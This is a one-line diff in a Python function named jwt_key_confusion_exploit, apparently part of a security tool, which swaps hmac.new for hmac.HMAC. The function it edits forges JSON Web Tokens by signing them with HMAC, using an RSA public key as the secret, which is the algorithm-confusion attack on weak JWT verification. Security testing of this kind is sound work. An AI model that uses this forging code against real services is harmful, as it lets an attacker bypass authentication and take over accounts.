@@ -341,7 +341,7 @@ def jwt_key_confusion_exploit(payload: dict, rsa_public_key_pem: str) -> str:
     header_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
     payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
     signing_input = f"{header_b64}.{payload_b64}".encode()
-    sig = hmac.new(rsa_public_key_pem.encode(), signing_input, hashlib.sha256).digest()
+    sig = hmac.HMAC(rsa_public_key_pem.encode(), signing_input, hashlib.sha256).digest()
     return f"{header_b64}.{payload_b64}.{_b64url(sig)}"
 
 
